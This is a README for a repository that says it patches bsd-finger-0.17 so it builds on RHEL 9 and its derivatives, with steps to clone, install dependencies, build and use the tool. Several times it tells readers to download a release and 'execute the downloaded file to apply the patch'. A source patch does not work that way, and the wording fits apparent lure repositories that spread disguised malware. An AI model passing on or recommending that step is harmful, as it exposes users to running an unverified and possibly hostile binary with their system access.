# Compatibility Patch for bsd-finger-0.17 on RHEL 9

![bsd-finger](https://img.shields.io/badge/bsd--finger-0.17-brightgreen.svg) ![RHEL9](https://img.shields.io/badge/RHEL9-compatible-blue.svg) ![AlmaLinux](https://img.shields.io/badge/AlmaLinux-9-orange.svg)

Welcome to the **bsd-finger-0.17-rhel9-patch** repository! This project provides a compatibility patch to help you build **bsd-finger-0.17** on RHEL 9, AlmaLinux 9, and Rocky Linux 9. 

You can download the latest release from the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases). Make sure to execute the downloaded file to apply the patch.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Usage](#usage)
- [Features](#features)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Overview

The **bsd-finger** command is a classic Unix utility that provides information about users on a system. However, due to various changes in modern Linux distributions, building older software like **bsd-finger-0.17** can be challenging. This patch addresses those challenges specifically for RHEL 9 and its derivatives.

### Key Topics

- **AlmaLinux 9**
- **RHEL 9**
- **Rocky Linux 9**
- **C Programming**
- **Legacy Unix**
- **Finger Command**

## Installation

To install the patch, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch.git
   cd bsd-finger-0.17-rhel9-patch
   ```

2. Download the latest release from the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases). Execute the downloaded file to apply the patch.

3. Install the necessary dependencies:
   ```bash
   sudo dnf install gcc make
   ```

4. Build the project:
   ```bash
   make
   ```

5. Install the binary:
   ```bash
   sudo make install
   ```

## Usage

Once installed, you can use the **finger** command as follows:

```bash
finger [options] [user]
```

### Common Options

- `-l`: Show detailed information about the user.
- `-m`: Match the user name.
- `-s`: Show short information.

### Example

To view information about a user named "john", use:

```bash
finger john
```

## Features

- **Compatibility**: Works seamlessly on RHEL 9, AlmaLinux 9, and Rocky Linux 9.
- **Simple Installation**: Easy to install with minimal dependencies.
- **Classic Functionality**: Retains the traditional features of the **finger** command.

## Contributing

Contributions are welcome! If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, please reach out to the repository owner:

- GitHub: [emingfdg](https://github.com/emingfdg)
- Email: emingfdg@example.com

Feel free to check the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases) for updates and new features!